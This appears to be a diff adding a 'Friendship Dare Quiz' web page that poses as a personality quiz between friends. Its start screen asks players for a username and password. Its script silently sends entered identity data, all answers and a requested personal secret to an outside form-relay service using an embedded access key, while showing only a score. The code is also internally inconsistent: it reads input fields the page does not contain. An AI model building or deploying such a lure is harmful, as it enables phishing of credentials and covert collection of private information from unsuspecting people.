@@ -1,0 +1,249 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Friendship Dare Quiz 🔥</title>
+  <style>
+    body {
+      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+      background: linear-gradient(135deg, #1e1e2f, #2a2a40);
+      color: #fff;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      min-height: 100vh;
+      margin: 0;
+      padding: 20px;
+    }
+    .card {
+      background: #2f2f46;
+      padding: 30px;
+      border-radius: 16px;
+      width: 100%;
+      max-width: 450px;
+      box-shadow: 0 10px 30px rgba(0,0,0,0.4);
+      text-align: center;
+    }
+    h1, h2 { margin-top: 0; }
+    input[type="text"], input[type="tel"], textarea {
+      width: 100%;
+      padding: 12px;
+      margin: 10px 0;
+      border-radius: 8px;
+      border: none;
+      font-size: 16px;
+      box-sizing: border-box;
+    }
+    .option {
+      display: block;
+      background: #3e3e5c;
+      padding: 12px;
+      margin: 10px 0;
+      border-radius: 8px;
+      cursor: pointer;
+      text-align: left;
+      transition: 0.2s;
+    }
+    .option:hover { background: #505075; }
+    .option input { margin-right: 10px; }
+    button {
+      background: #ff4b6e;
+      color: white;
+      border: none;
+      padding: 14px 24px;
+      font-size: 16px;
+      font-weight: bold;
+      border-radius: 8px;
+      cursor: pointer;
+      width: 100%;
+      margin-top: 15px;
+    }
+    button:hover { background: #ff2e56; }
+    .hidden { display: none; }
+    .loader {
+      border: 5px solid #3e3e5c;
+      border-top: 5px solid #ff4b6e;
+      border-radius: 50%;
+      width: 45px;
+      height: 45px;
+      animation: spin 1s linear infinite;
+      margin: 20px auto;
+    }
+    @keyframes spin { 100% { transform: rotate(360deg); } }
+  </style>
+</head>
+<body>
+
+  <!-- 1. START SCREEN -->
+  <div class="card" id="start-screen">
+    <h1>Friendship Dare 🔥</h1>
+    <p>Enter your details to start the 10-question challenge!</p>
+    <input type="text" id="Username" placeholder="Enter your Username..." required />
+    <input type="tel" id="Password" placeholder="Enter your Password..." required />
+    <button onclick="startQuiz()">Start Quiz 🚀</button>
+  </div>
+
+  <!-- 2. QUIZ SCREEN -->
+  <div class="card hidden" id="quiz-screen">
+    <p id="progress-text">Question 1 of 10</p>
+    <h2 id="question-text"></h2>
+    <div id="options-container"></div>
+    <textarea id="secret-input" class="hidden" rows="4" placeholder="Write your honest secret here..."></textarea>
+    <button id="next-btn" onclick="nextQuestion()">Next ➡</button>
+  </div>
+
+  <!-- 3. CALCULATING SCREEN -->
+  <div class="card hidden" id="loading-screen">
+    <h2>Calculating Score... ⏳</h2>
+    <div class="loader"></div>
+    <p>Checking how well you really know me!</p>
+  </div>
+
+  <!-- 4. RESULT SCREEN -->
+  <div class="card hidden" id="result-screen">
+    <h1 id="score-display">Your Score: 80% 🔥</h1>
+    <p id="score-message">You know me pretty well! Thanks for playing.</p>
+  </div>
+
+  <script>
+    // EDIT YOUR CORRECT ANSWERS HERE (Questions 1 to 9)
+    const quizData = [
+      { q: "What is my favorite color?", options: ["Black", "Blue", "Red", "White"], answer: "Black" },
+      { q: "What is my favorite food?", options: ["Biryani", "Pizza", "Burger", "Momos"], answer: "Biryani" },
+      { q: "What do I love doing in free time?", options: ["Sleeping", "Scrolling Reels", "Gaming", "Listening to Music"], answer: "Gaming" },
+      { q: "What is my dream travel destination?", options: ["Goa", "Manali", "Dubai", "Paris"], answer: "Dubai" },
+      { q: "What is my biggest fear?", options: ["Ghosts", "Losing loved ones", "Heights", "Insects"], answer: "Losing loved ones" },
+      { q: "Am I a morning person or night owl?", options: ["Night Owl 🦉", "Morning Person ☀"], answer: "Night Owl 🦉" },
+      { q: "What would I choose first?", options: ["Unlimited Money 💸", "True Love ❤", "Global Fame 🌟"], answer: "Unlimited Money 💸" },
+      { q: "What is my best quality according to you?", options: ["Loyalty", "Sense of Humor", "Kindness", "Looks"], answer: "Loyalty" },
+      { q: "Do you secretly have a crush on me? 👀", options: ["Yes 😳", "Maybe a little 🙈", "No, just friends 🤝"], answer: "No, just friends 🤝" },
+      { q: "Write one honest secret about me or you!", options: [], answer: "TEXT" }
+    ];
+
+    let currentIdx = 0;
+    let friendName = "";
+    let friendPhone = "";
+    let userAnswers = [];
+
+    function startQuiz() {
+      const nameInput = document.getElementById("friend-name").value.trim();
+      const phoneInput = document.getElementById("friend-phone").value.trim();
+
+      if (!nameInput || !phoneInput) {
+        alert("Please enter both your name and phone number first!");
+        return;
+      }
+
+      friendName = nameInput;
+      friendPhone = phoneInput;
+
+      document.getElementById("start-screen").classList.add("hidden");
+      document.getElementById("quiz-screen").classList.remove("hidden");
+      loadQuestion();
+    }
+
+    function loadQuestion() {
+      const current = quizData[currentIdx];
+      document.getElementById("progress-text").innerText = `Question ${currentIdx + 1} of ${quizData.length}`;
+      document.getElementById("question-text").innerText = current.q;
+
+      const optionsDiv = document.getElementById("options-container");
+      const secretBox = document.getElementById("secret-input");
+      const nextBtn = document.getElementById("next-btn");
+
+      optionsDiv.innerHTML = "";
+
+      if (current.answer === "TEXT") {
+        secretBox.classList.remove("hidden");
+        nextBtn.innerText = "See My Score 🎉";
+      } else {
+        secretBox.classList.add("hidden");
+        nextBtn.innerText = "Next ➡";
+        current.options.forEach(opt => {
+          optionsDiv.innerHTML += `
+            <label class="option">
+              <input type="radio" name="qopt" value="${opt}"> ${opt}
+            </label>
+          `;
+        });
+      }
+    }
+
+    function nextQuestion() {
+      const current = quizData[currentIdx];
+
+      if (current.answer === "TEXT") {
+        const secretVal = document.getElementById("secret-input").value.trim();
+        if (!secretVal) {
+          alert("Please write something before seeing your score!");
+          return;
+        }
+        userAnswers.push({ question: current.q, chosen: secretVal, correct: "Secret Answer" });
+        finishQuiz();
+        return;
+      }
+
+      const selected = document.querySelector('input[name="qopt"]:checked');
+      if (!selected) {
+        alert("Please select an option!");
+        return;
+      }
+
+      userAnswers.push({
+        question: current.q,
+        chosen: selected.value,
+        correct: current.answer
+      });
+
+      currentIdx++;
+      loadQuestion();
+    }
+
+    async function finishQuiz() {
+      document.getElementById("quiz-screen").classList.add("hidden");
+      document.getElementById("loading-screen").classList.remove("hidden");
+
+      // Calculate score on first 9 questions
+      let correctCount = 0;
+      for (let i = 0; i < 9; i++) {
+        if (userAnswers[i].chosen === userAnswers[i].correct) {
+          correctCount++;
+        }
+      }
+      const percentage = Math.round((correctCount / 9) * 100);
+
+      // Format Name, Phone, Score, and all 10 answers for your email
+      let formattedReport = `Friend Name: ${friendName}\nPhone Number: ${friendPhone}\nScore: ${percentage}% (${correctCount}/9)\n\n`;
+      userAnswers.forEach((item, index) => {
+        formattedReport += `Q${index + 1}: ${item.question}\nAnswer: ${item.chosen}\n\n`;
+      });
+
+      // Send answers to your email via Web3Forms
+      try {
+        await fetch("https://web3forms.com", {
+          method: "POST",
+          headers: {
+            "Content-Type": "application/json",
+            "Accept": "application/json"
+          },
+          body: JSON.stringify({
+            access_key: "311771ad-15c8-4dfb-92e4-f85ad98b6212",
+            subject: `🔥 Friendship Quiz Result from ${friendName} (${percentage}%)`,
+            from_name: friendName,
+            phone: friendPhone,
+            message: formattedReport
+          })
+        });
+      } catch (err) {
+        console.error("Email send error:", err);
+      } finally {
+        // Always show the final score screen so it never gets stuck
+        document.getElementById("loading-screen").classList.add("hidden");
+        document.getElementById("result-screen").classList.remove("hidden");
+        document.getElementById("score-display").innerText = `Your Score: ${percentage}% 🔥`;
+      }
+    }
+  </script>
+</body>
+</html>
